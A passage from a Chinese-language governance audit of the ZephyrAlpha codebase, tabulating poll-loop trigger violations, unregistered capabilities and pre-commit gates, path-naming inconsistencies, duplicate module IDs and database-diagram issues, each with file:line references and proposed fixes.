| 2 | [commit_trigger.py:207](file:///D:/ZephyrAlpha/src/zephyr/security/adversarial_validation/commit_trigger.py#L207) + [:212](file:///D:/ZephyrAlpha/src/zephyr/security/adversarial_validation/commit_trigger.py#L212) | 30s | boot_hooks→RedBlueTriggerConsumer().start() | 是 |
| 3 | [fix_scheduler.py:91](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/auto_fix_engine/fix_scheduler.py#L91) + [:105](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/auto_fix_engine/fix_scheduler.py#L105) | 300s | CONTINUOUS默认模式 | 是 |
| 4 | [fix_scheduler.py:88](file:///D:/ZephyrAlpha/src/zephyr/security/access_control/auto_fix_engine_03/fix_scheduler.py#L88) + [:102](file:///D:/ZephyrAlpha/src/zephyr/security/access_control/auto_fix_engine_03/fix_scheduler.py#L102) | 300s | 同上（副本） | 是 |
| 5 | [pipeline_orchestrator.py:276](file:///D:/ZephyrAlpha/src/zephyr/integration/pipeline_orchestrator.py#L276) + [:277](file:///D:/ZephyrAlpha/src/zephyr/integration/pipeline_orchestrator.py#L277) | 3600s | start_periodic_profile() | 是 |
| 6 | [health_monitor.py:166](file:///D:/ZephyrAlpha/src/zephyr/trading/health_monitor.py#L166) + [:177](file:///D:/ZephyrAlpha/src/zephyr/trading/health_monitor.py#L177) | metrics_interval | boot监控模块初始化 | 是 |
| 7 | [local_model_scheduler.py:221](file:///D:/ZephyrAlpha/src/zephyr/integration/local_model/local_model_scheduler.py#L221) + [:275](file:///D:/ZephyrAlpha/src/zephyr/integration/local_model/local_model_scheduler.py#L275) | backoff | 调度器启动 | 是 |
| 8 | [process_pool.py:212](file:///D:/ZephyrAlpha/src/zephyr/shared/infra/process_pool.py#L212) + [:217](file:///D:/ZephyrAlpha/src/zephyr/shared/infra/process_pool.py#L217) | zombie_interval | 进程池僵尸扫描 | 是 |
| 9 | [daemon_registry.py:333](file:///D:/ZephyrAlpha/src/zephyr/shared/lifecycle/daemon_registry.py#L333) + [:361](file:///D:/ZephyrAlpha/src/zephyr/shared/lifecycle/daemon_registry.py#L361) | 30s | _monitor_loop类方法 | 是 |
| 10 | [watchdog.py:100](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/system_telemetry/watchdog.py#L100) + [:108](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/system_telemetry/watchdog.py#L108) | interval | standalone心跳 | 是 |
| 11 | [resource_optimization.py:685](file:///D:/ZephyrAlpha/src/zephyr/trading/resource_optimization.py#L685) + [:716](file:///D:/ZephyrAlpha/src/zephyr/trading/resource_optimization.py#L716) | 30s | auto_runtime_core:143 start_monitor(30) | 是 |
| 12 | [resource_optimization_engine.py:627](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/lifecycle/resource_optimization_engine.py#L627) + [:658](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/lifecycle/resource_optimization_engine.py#L658) | 30s | 副本 | 是 |
| 13 | [rule_watcher.py:115](file:///D:/ZephyrAlpha/src/zephyr/governance/rule_watcher.py#L115) + [:380](file:///D:/ZephyrAlpha/src/zephyr/governance/rule_watcher.py#L380) | 5s | main→watcher.start()；另[:6](file:///D:/ZephyrAlpha/src/zephyr/governance/rule_watcher.py#L6)标`[STARTUP] manual`（同时命中manual维度） | 是 |
| 14 | [__main__.py:67](file:///D:/ZephyrAlpha/src/zephyr/trading/__main__.py#L67) + [:69](file:///D:/ZephyrAlpha/src/zephyr/trading/__main__.py#L69) | poll_interval | AutoRuntimeCore reconcile主循环 | 是 |
| 15 | [file_watcher.py:160](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/file_watcher.py#L160) | 60s | auto_runtime_core:295 _start_blueprint_watcher() | 是 |

#### 5.2.3 队列/事件排空型poll-loop（11条，中）

| # | 文件:行号 | 模式 |
|---|---|---|
| 16 | [outbox.py:209](file:///D:/ZephyrAlpha/src/zephyr/shared/infra/outbox.py#L209) | `while self._running`（async _poll_loop） |
| 17 | [outbox.py:209](file:///D:/ZephyrAlpha/src/zephyr/shared/infra_06/outbox.py#L209) | 副本 |
| 18 | [task_queue.py:118](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/queue/task_queue.py#L118) + [:126](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/queue/task_queue.py#L126) | start_polling()自动启动 |
| 19 | [task_queue.py:123](file:///D:/ZephyrAlpha/src/zephyr/trading/orchestrator/core/task_queue.py#L123) | `while not _stop_event.is_set()` |
| 20 | [task_queue.py:123](file:///D:/ZephyrAlpha/src/zephyr/governance/audit_orchestration/core/task_queue.py#L123) | 副本 |
| 21 | [in_process_vector_memory.py:383](file:///D:/ZephyrAlpha/src/zephyr/integration/vector_memory/in_process_vector_memory.py#L383) | `while not _stop_event.is_set()` |
| 22 | [auto_evolution.py:88](file:///D:/ZephyrAlpha/src/zephyr/ops/auto_evolution.py#L88) | `while not _stop_event.is_set()` |
| 23 | [facade.py:420](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/system_telemetry/facade.py#L420) | `while not _scheduler_stop.is_set()` |
| 24 | [rollback_scheduler.py:149](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/rollback/rollback_scheduler.py#L149) | `while not _stop_event.is_set()` |
| 25 | [async_monitor.py:96](file:///D:/ZephyrAlpha/src/zephyr/security/adversarial_validation/async_monitor.py#L96) | `while not _stop_event.is_set()` |
| 26 | [f5_shutdown_manager.py:501](file:///D:/ZephyrAlpha/src/zephyr/governance/f5_shutdown_manager.py#L501) | `while not _idle_stop.is_set()` |

> **注**：#19/#20/#17疑为副本/重导出，建议合并去重后可减少2~3条。

#### 5.2.4 永久性脚本仅manual触发（1条，高）

| # | 文件:行号 | 证据 | 可治本 |
|---|---|---|:---:|
| 1 | [rule_watcher.py:6](file:///D:/ZephyrAlpha/src/zephyr/governance/rule_watcher.py#L6) | 标`# [STARTUP] manual`，但实质是常驻YAML规则变更监控（Watcher），却靠5s poll-loop而非文件系统事件驱动；与5.2.2#13同点 | 是（改watchdog/事件订阅） |

> **说明**：其余`src`中标manual的多为CLI入口/一次性工具（`__main__.py`、`cli.py`、`dashboard.py`、`verify_paths.py`等），属合理manual，不计违规。`scripts/governance/`下约93个manual脚本多为一次性CLI工具（audit_*/check_*/validate_*/sync_*/fix_*/generate_*等），由run_all.py/CI/git hook调用，manual标记合理。

#### 5.2.5 已治本（标杆，不计违规）

1. **CircadianScheduler已彻底废除**（2026-06-26裁定）：`boot_cron_jobs.py:9`、`lifecycle_manager.py:16`、`commit_trigger.py:32`均明确定时调度已移除
2. **FLE调度器daemon模式已废除**（trae_053 v2.0.0）：[auto_runtime_core.py:306](file:///D:/ZephyrAlpha/src/zephyr/trading/auto_runtime_core.py#L306)仅实例化供`tick()`单次执行
3. **非违规的合法sleep/while**（已逐一甄别排除）：`git_commit_gateway.py:245`（带deadline的文件锁争抢）、`retry_handler.py:125`/`staging_area.py`/`rollback_integration.py:446`（指数退避重试）、`safety_brake.py:179`（倒计时等待）、`timeout_guard.py:71`（一次性Timer）、`engine_sandbox.py:290`（临时权限回收Timer）

---

### 5.3 新AI可发现性违规（55个）

#### 5.3.1 未注册关键能力（10条，高）

AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR两个铁律关键能力也未注册。

| # | 违规类型 | 文件:行号 | 新AI误判后果 |
|---|---|---|---|
| 1 | 核心系统未注册 | [AGENTS.md:33](file:///D:/ZephyrAlpha/AGENTS.md#L33) | AutoRuntime Core（系统大脑）无capability反查；新AI搜"autoruntime/系统大脑调度"找不到canonical入口`python -m zephyr.trading`，可能重建第二套运行时入口 |
| 2 | 核心系统未注册 | [AGENTS.md:34](file:///D:/ZephyrAlpha/AGENTS.md#L34) | PipelineOrchestrator（M1-M11管线编排）无反查；新AI搜"pipeline orchestrator/管线编排"命中空，可能重建编排器 |
| 3 | 核心系统未注册 | [AGENTS.md:35](file:///D:/ZephyrAlpha/AGENTS.md#L35) | AgentOrchestrator（Agent生命周期）无反查；新AI搜"agent orchestrator/agent生命周期"命中空，可能重建 |
| 4 | 核心系统未注册 | [AGENTS.md:36](file:///D:/ZephyrAlpha/AGENTS.md#L36) | TaskRepository（10状态任务机）无反查；新AI搜"task repo/任务状态机"命中空，可能重建任务存储 |
| 5 | 核心系统未注册 | [AGENTS.md:37](file:///D:/ZephyrAlpha/AGENTS.md#L37) | GitCommitGateway类本身未注册——registry只注册了门禁脚本`gate_commit_gw`→`validate_commit_gateway.py`，未注册Gateway类；新AI搜"git commit gateway/唯一合法commit入口"反查不到类canonical，可能裸git commit |
| 6 | 核心系统未注册 | [AGENTS.md:38](file:///D:/ZephyrAlpha/AGENTS.md#L38) | A2A Protocol（Agent间通信，MOD-INF-025）无反查；新AI搜"a2a/agent通信/冲突解决"命中空，可能重建通信协议 |
| 7 | 核心系统未注册 | [AGENTS.md:40](file:///D:/ZephyrAlpha/AGENTS.md#L40) | MCP Servers（10个）无反查；新AI搜"mcp servers/工具列表注册表"命中空，可能重建MCP注册机制 |
| 8 | 核心系统未注册 | [AGENTS.md:41](file:///D:/ZephyrAlpha/AGENTS.md#L41) | Trigger Router（6触发器事件路由）无反查；新AI搜"trigger router/事件驱动路由"命中空，可能重建路由表 |
| 9 | 铁律关键能力未注册 | [project_rules.md:102](file:///D:/ZephyrAlpha/.trae/rules/project_rules.md#L102) + [onboarding_detail.md:11](file:///D:/ZephyrAlpha/.trae/rules/onboarding_detail.md#L11) | `lock_files.py`（RULE-ZERO文件锁协议，全项目写入安全基石）未注册；新AI搜"文件锁/lock_files/write guard"在CapabilityLookup命中空，可能重建第二套锁机制或直接Write绕过锁 |
| 10 | 铁律关键能力未注册 | [project_rules.md:330](file:///D:/ZephyrAlpha/.trae/rules/project_rules.md#L330) + [onboarding_detail.md:64](file:///D:/ZephyrAlpha/.trae/rules/onboarding_detail.md#L64) | `scaffold.py`（RULE-FOUR唯一文件创建入口，SSoT主防线）未注册；新AI搜"scaffold/创建即注册/孤儿检测入口"在CapabilityLookup命中空，可能重建创建入口或直接Write造孤儿 |

#### 5.3.2 GATE无capability反查（40条，中）

`.pre-commit-config.yaml`共51个gate-* id，其中11个在capability registry有语义反查，剩余40个无反查。

| # | gate id | 文件:行号 |
|---|---|---|
| 1 | gate-01-index-reachability | [.pre-commit-config.yaml:116](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L116) |
| 2 | gate-02-p0-contract-integrity | [.pre-commit-config.yaml:128](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L128) |
| 3 | gate-03-invariant-owner | [.pre-commit-config.yaml:140](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L140) |
| 4 | gate-06-kb-decision-status | [.pre-commit-config.yaml:152](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L152) |
| 5 | gate-07-event-publisher-layer | [.pre-commit-config.yaml:164](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L164) |
| 6 | gate-11-naming-convention | [.pre-commit-config.yaml:180](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L180) |
| 7 | gate-11-ssot | [.pre-commit-config.yaml:200](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L200) |
| 8 | gate-rules-integrity | [.pre-commit-config.yaml:234](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L234) |
| 9 | gate-12-blueprint-provenance | [.pre-commit-config.yaml:271](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L271) |
| 10 | gate-14-authority-registry | [.pre-commit-config.yaml:288](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L288) |
| 11 | gate-13-blueprint-overlap | [.pre-commit-config.yaml:304](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L304) |
| 12 | gate-triple-align | [.pre-commit-config.yaml:319](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L319) |
| 13 | gate-16-architecture-compliance | [.pre-commit-config.yaml:369](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L369) |
| 14 | gate-17-orphan-py | [.pre-commit-config.yaml:385](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L385) |
| 15 | gate-src-no-data | [.pre-commit-config.yaml:402](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L402) |
| 16 | gate-zr-zero-residue | [.pre-commit-config.yaml:465](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L465) |
| 17 | gate-ssot-singlesource | [.pre-commit-config.yaml:497](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L497) |
| 18 | gate-18-test-collection | [.pre-commit-config.yaml:514](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L514) |
| 19 | gate-19-test-structure | [.pre-commit-config.yaml:527](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L527) |
| 20 | gate-mut | [.pre-commit-config.yaml:546](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L546) |
| 21 | gate-ssot-docs | [.pre-commit-config.yaml:561](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L561) |
| 22 | gate-reg-bl-baseline-aware | [.pre-commit-config.yaml:577](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L577) |
| 23 | gate-rule-frontmatter | [.pre-commit-config.yaml:592](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L592) |
| 24 | gate-bp-place | [.pre-commit-config.yaml:606](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L606) |
| 25 | gate-sq-script-quality | [.pre-commit-config.yaml:624](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L624) |
| 26 | gate-adm-manifest-admission | [.pre-commit-config.yaml:641](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L641) |
| 27 | gate-idx-index-reality | [.pre-commit-config.yaml:657](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L657) |
| 28 | gate-dd07-shared-bypass | [.pre-commit-config.yaml:673](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L673) |
| 29 | gate-21-manifest-drift | [.pre-commit-config.yaml:701](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L701) |
| 30 | gate-generate-derived | [.pre-commit-config.yaml:736](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L736) |
| 31 | gate-schema-health | [.pre-commit-config.yaml:757](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L757) |
| 32 | gate-22-load-path-integrity | [.pre-commit-config.yaml:771](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L771) |
| 33 | gate-c1-ssot-status-enum | [.pre-commit-config.yaml:807](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L807) |
| 34 | gate-mcp-contract-consistency | [.pre-commit-config.yaml:823](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L823) |
| 35 | gate-c2-contract-code-drift | [.pre-commit-config.yaml:837](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L837) |
| 36 | gate-path-naming | [.pre-commit-config.yaml:871](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L871) |
| 37 | gate-bom-utf8-check | [.pre-commit-config.yaml:879](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L879) |
| 38 | gate-encoding-safety | [.pre-commit-config.yaml:894](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L894) |
| 39 | gate-stash-count | [.pre-commit-config.yaml:909](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L909) |
| 40 | gate-drift-light-scan | [.pre-commit-config.yaml:939](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L939) |

> **共同后果**：新AI通过`CapabilityLookup.find("gate-xxx关键词")`反查不到canonical脚本，无法判断该门禁是否已存在；当需要扩展同类检测时，可能重建重复脚本（违反向内收原则①）。

#### 5.3.3 路径双源/矛盾（1条，中）

| # | 违规类型 | 文件:行号 | 新AI误判后果 |
|---|---|---|---|
| 1 | depgraph存储介质表述双源 | [AGENTS.md:145](file:///D:/ZephyrAlpha/AGENTS.md#L145)/[155](file:///D:/ZephyrAlpha/AGENTS.md#L155)/[162](file:///D:/ZephyrAlpha/AGENTS.md#L162)/[167](file:///D:/ZephyrAlpha/AGENTS.md#L167)/[168](file:///D:/ZephyrAlpha/AGENTS.md#L168)/[169](file:///D:/ZephyrAlpha/AGENTS.md#L169) vs [364](file:///D:/ZephyrAlpha/AGENTS.md#L364) | §6多处用"depgraph"（SQLite语义文件名），§11 line 364声明"depgraph是唯一全景真源（PostgreSQL 16，localhost:5432）"。新AI读§6会误判depgraph是SQLite文件，可能尝试`sqlite3 depgraph`直连或重建SQLite副本 |

#### 5.3.4 module_id重复（2条，中）

| # | 违规类型 | 文件:行号 | 新AI误判后果 |
|---|---|---|---|
| 1 | MOD-GOVERNANCE重复 | [blueprint_registry.yaml:133](file:///D:/ZephyrAlpha/docs/03_modules/blueprint_registry.yaml#L133) + [147](file:///D:/ZephyrAlpha/docs/03_modules/blueprint_registry.yaml#L147) | 同一module_id出现2次：line 133指向`_domain_governance/blueprint.md`（Active），line 147指向`_domain_governance/capacity_upgrade/blueprint.md`（Active）。新AI查module_id→blueprint会得到两个canonical，无法判断哪个是真源 |
| 2 | MOD-FEEDBACK_LOOP重复 | [blueprint_registry.yaml:118](file:///D:/ZephyrAlpha/docs/03_modules/blueprint_registry.yaml#L118) + [292](file:///D:/ZephyrAlpha/docs/03_modules/blueprint_registry.yaml#L292) | 同一module_id出现2次：line 118指向`capacity_upgrade/blueprint.md`（Draft），line 292指向`feedback_loop/blueprint.md`（Draft）。新AI查询得到歧义结果 |

#### 5.3.5 文件残留（1条，高）

| # | 违规类型 | 文件:行号 | 新AI误判后果 |
|---|---|---|---|
| 1 | depgraph根目录残留 | `D:\ZephyrAlpha\depgraph`（0字节，LastWriteTime 2026/6/29 17:40:34，gitignored但物理存在） | 仓库根目录存在0字节`depgraph`文件。虽然`.gitignore`忽略且`git ls-files`未跟踪，但物理文件残留违反RULE-FOURTEEN根目录白名单。更严重：depgraph已P2迁移至PostgreSQL，残留SQLite文件名会让新AI误判depgraph仍是SQLite，可能尝试`sqlite3 depgraph`直连——与5.3.3的§6文档矛盾叠加，形成"文件残留+文档双源"双重误导 |

#### 5.3.6 路径命名不一致（1条聚合，中，涉及11文件57行）

| # | 违规类型 | 文件:行号 | 新AI误判后果 |
|---|---|---|---|
| 1 | `_master-blueprint`（连字符）vs `_master_blueprint`（下划线物理目录）跨11文件57行 | 见下方文件清单 | 物理目录是`_master_blueprint`（下划线，符合snake_case硬约束），但11个文件中57处引用写成`_master-blueprint`（连字符）。新AI按引用路径寻找文件会失败，可能误判文件丢失并重建 |

**受影响文件清单（11个文件，57行）**：
- [system_pathway_registry.yaml:60](file:///D:/ZephyrAlpha/docs/03_modules/system_pathway_registry.yaml#L60)/[309](file:///D:/ZephyrAlpha/docs/03_modules/system_pathway_registry.yaml#L309)/[311](file:///D:/ZephyrAlpha/docs/03_modules/system_pathway_registry.yaml#L311)/[314](file:///D:/ZephyrAlpha/docs/03_modules/system_pathway_registry.yaml#L314)（4行）
- [_sys_master/blueprint.md:47](file:///D:/ZephyrAlpha/docs/03_modules/_sys_master/blueprint.md#L47)/[75](file:///D:/ZephyrAlpha/docs/03_modules/_sys_master/blueprint.md#L75)/[782](file:///D:/ZephyrAlpha/docs/03_modules/_sys_master/blueprint.md#L782)/[840](file:///D:/ZephyrAlpha/docs/03_modules/_sys_master/blueprint.md#L840)/[3874](file:///D:/ZephyrAlpha/docs/03_modules/_sys_master/blueprint.md#L3874)（5行）
- [_master_blueprint/blueprint.md:46](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint.md#L46)/[49](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint.md#L49)/[52](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint.md#L52)/[71](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint.md#L71)/[107](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint.md#L107)/[108](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint.md#L108)/[109](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint.md#L109)/[193](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint.md#L193)/[194](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint.md#L194)/[195](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint.md#L195)/[211](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint.md#L211)/[212](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint.md#L212)/[213](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint.md#L213)/[214](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint.md#L214)（14行——自身目录内引用连字符，最严重）
- [_master_blueprint/blueprint_capacity.md:19](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_capacity.md#L19)/[38](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_capacity.md#L38)/[59](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_capacity.md#L59)/[80](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_capacity.md#L80)/[317](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_capacity.md#L317)/[1927](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_capacity.md#L1927)/[1928](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_capacity.md#L1928)/[1944](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_capacity.md#L1944)/[1945](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_capacity.md#L1945)/[1946](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_capacity.md#L1946)（10行）
- [_master_blueprint/blueprint_baseline.md:22](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_baseline.md#L22)/[56](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_baseline.md#L56)/[57](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_baseline.md#L57)/[67](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_baseline.md#L67)/[80](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_baseline.md#L80)/[81](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_baseline.md#L81)（6行）
- [_master_blueprint/blueprint_agent_spec.md:19](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_agent_spec.md#L19)/[41](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_agent_spec.md#L41)/[62](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_agent_spec.md#L62)/[72](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_agent_spec.md#L72)/[254](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_agent_spec.md#L254)/[314](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_agent_spec.md#L314)/[487](file:///D:/ZephyrAlpha/docs/03_modules/_master_blueprint/blueprint_agent_spec.md#L487)（7行）
- [_cross_layer/gate_engine/blueprint.md:704](file:///D:/ZephyrAlpha/docs/03_modules/_cross_layer/gate_engine/blueprint.md#L704)/[841](file:///D:/ZephyrAlpha/docs/03_modules/_cross_layer/gate_engine/blueprint.md#L841)/[1323](file:///D:/ZephyrAlpha/docs/03_modules/_cross_layer/gate_engine/blueprint.md#L1323)（3行）
- [_cross_layer/context_engine/blueprint.md:147](file:///D:/ZephyrAlpha/docs/03_modules/_cross_layer/context_engine/blueprint.md#L147)（1行）
- [_cross_layer/model_profiler/blueprint.md:397](file:///D:/ZephyrAlpha/docs/03_modules/_cross_layer/model_profiler/blueprint.md#L397)（1行）
- [_cross_layer/resource_optimization_engine/blueprint.md:813](file:///D:/ZephyrAlpha/docs/03_modules/_cross_layer/resource_optimization_engine/blueprint.md#L813)/[1183](file:///D:/ZephyrAlpha/docs/03_modules/_cross_layer/resource_optimization_engine/blueprint.md#L1183)（2行）
- [_domain_governance/blueprint.md:58](file:///D:/ZephyrAlpha/docs/03_modules/_domain_governance/blueprint.md#L58)/[1879](file:///D:/ZephyrAlpha/docs/03_modules/_domain_governance/blueprint.md#L1879)/[2014](file:///D:/ZephyrAlpha/docs/03_modules/_domain_governance/blueprint.md#L2014)/[2029](file:///D:/ZephyrAlpha/docs/03_modules/_domain_governance/blueprint.md#L2029)（4行）

---

### 5.4 DB全景图深度违规（17个，第5轮新增）

> **维度新增理由**：初轮3维度（SSoT/触发/可发现性）未覆盖DB全景图内部一致性、死代码、schema健康检查覆盖率、孤儿过滤逻辑。第5轮深扫DB相关代码发现17个新违规点。

#### 5.4.1 真孤儿未监控（HIGH，1聚合 = 603个真孤儿被过滤掩盖）

**违反**：trae_060 §4 第一性原理治本（过滤掩盖真问题=治标不治本）
**证据**：
- [diagnose_depgraph.py:58](file:///D:/ZephyrAlpha/scripts/governance/diagnose_depgraph.py#L58) `ORPHAN_EXEMPT_TYPES` frozenset 包含9种类型，把949个真孤儿滤成346
- 初轮报告数据=346，实际真孤儿=949，**603个真孤儿未进入治理层视野**
- 过滤豁免包含 `capability_card / config / rule_definition / vocabulary` 等，这些类型确实有合理豁免理由，但豁免理由未文档化、无门禁验证、无上限阈值
**病根**：根因1（静态快照）+ 根因3（建议性反查——豁免逻辑是建议性而非AST强制）
**修复方向**：豁免清单入词表YAML（`orphan_exempt_types_vocabulary.yaml`），豁免理由强制字段，新增豁免须通过审查

#### 5.4.2 schema健康检查脱管2表（MEDIUM × 2）

**违反**：trae_060 §2 唯一真源（schema健康检查应覆盖全部表）
**证据**：
- [verify_schema_health.py:106-128](file:///D:/ZephyrAlpha/scripts/governance/verify_schema_health.py#L106-L128) `_DDL_MAP` 仅含21表
- DB实际有25表，2表脱管：`derived_identifier_registry`、`domain_naming_rules`
- 脱管表的schema漂移无法被检测
**病根**：根因1（静态清单未随DB演进）
**修复方向**：`_DDL_MAP` 改为从DB元数据动态派生（`SELECT tablename FROM pg_catalog.pg_tables`）

#### 5.4.3 depgraph_schema.py路径列死代码（MEDIUM）

**违反**：trae_060 §2 prohibitions第5条"迁移/重构替换使用点后遗留定义点死代码"
**证据**：
- [depgraph_schema.py:840](file:///D:/ZephyrAlpha/src/zephyr/governance/depgraph_schema.py#L840) path列注释"to be cleaned up before UNIQUE upgrade"
- 注释标注的清理任务从未执行，UNIQUE约束未加，path列仍可重复
**病根**：根因1（静态快照——TODO注释遗留未追踪）
**修复方向**：清理path列重复值 + 加UNIQUE约束 + 删TODO注释

#### 5.4.4 diagnose_depgraph.py硬编码词表（MEDIUM）

**违反**：trae_060 §2 唯一真源直接消费（禁止硬编码词表合法值）
**证据**：
- [diagnose_depgraph.py:427](file:///D:/ZephyrAlpha/scripts/governance/diagnose_depgraph.py#L427) `VALID_SEMANTIC_TYPES` frozenset 硬编码
- GATE-VOCAB未检出（变量名不匹配检测模式）
**病根**：根因2（GATE-VOCAB机械盲区）
**修复方向**：改为从 `semantic_types_vocabulary.yaml` 动态加载（如果该词表存在）或新建词表

#### 5.4.5 autopilot.py空handler（MEDIUM）

**违反**：trae_060 §3 事件handler空实现（已在5.2统计，此处为新发现的具体实例）
**证据**：
- [autopilot.py:215](file:///D:/ZephyrAlpha/src/zephyr/trading/autopilot.py#L215) `_on_task_completed` 仅log，无业务逻辑
- [autopilot.py:197-200](file:///D:/ZephyrAlpha/src/zephyr/trading/autopilot.py#L197-L200) 注释自承"run_cycle deferred to AI session"
**病根**：根因4（manual例外开口过大——AI session触发=变相manual）
**修复方向**：删除空handler或实现为基于事件总线的真实消费者

#### 5.4.6 ide_health_daemon时间触发（MEDIUM）

**违反**：trae_060 §3 禁止时间触发
**证据**：
- [ide_health_daemon.py:51](file:///D:/ZephyrAlpha/src/zephyr/trading/ide_health_daemon.py#L51) `_SCAN_INTERVAL_SECONDS = 30.0`
- [ide_health_daemon.py:341-363](file:///D:/ZephyrAlpha/src/zephyr/trading/ide_health_daemon.py#L341-L363) `while self._running: time.sleep` poll-loop
**病根**：根因1（静态快照未含此实例）+ 根因4（守护进程例外开口）
**修复方向**：改事件驱动（IDE窗口状态变更事件）

#### 5.4.7 rule_watcher.py双违规（MEDIUM × 2 = 2聚合）

**违反**：trae_060 §3 manual触发 + sleep-loop（双违规）
**证据**：
- [rule_watcher.py](file:///D:/ZephyrAlpha/src/zephyr/governance/rule_watcher.py) 永久功能仅manual触发
- 内部含while+sleep轮询模式
**病根**：根因1+根因4
**修复方向**：合并进`reconciliation_registry.py`的事件钩子或boot_hooks.py

#### 5.4.8 死代码与废弃函数（MEDIUM × 6）

**违反**：trae_060 §2 死代码遗留
**证据**：
1. `depgraph_schema.py:1210 get_db_connection` 废弃别名仍存在
2. `auto_runner.py _DEPGRAPH_DB` 死常量（trae_060 §2 prohibitions第5条已点名）
3. `circadian_scheduler.py register_task/start/stop/save_state` 全是no-op死方法
4. `boot_cron_jobs.py` 引用已废止CircadianScheduler
5. `f5_boot_integration.py` 引用已废止CircadianScheduler
6. `lifecycle_manager.py` 引用已废止CircadianScheduler
**病根**：根因1（静态快照未追踪废弃清理）
**修复方向**：批量删除6处死代码

#### 5.4.9 drift_cron_scheduler.py时间触发残留（MEDIUM）

**违反**：trae_060 §3 时间触发
**证据**：[drift_cron_scheduler.py:48](file:///D:/ZephyrAlpha/src/zephyr/governance/drift_cron_scheduler.py#L48) 时间触发残留
**病根**：根因1（trae_060 §5已列但未清理）
**修复方向**：删除或改CI兜底

